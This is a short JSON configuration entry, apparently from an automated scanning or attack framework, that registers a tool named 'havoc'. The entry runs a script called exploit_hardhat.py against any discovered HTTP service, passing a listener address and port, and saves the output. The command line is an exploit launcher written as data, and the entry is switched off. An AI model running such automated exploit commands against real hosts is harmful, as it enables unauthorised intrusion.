{
	"toolname": "havoc",
	"command": "cd /home/grisun0/src/scripts ; python3 exploit_hardhat.py -t https://{ip}/ -i 127.0.0.1 -p 40056 |tee {outputdir}/{toolname}.txt",
	"trigger": ["http", "https", "http-mgmt", "http-alt"],
	"active": false
}
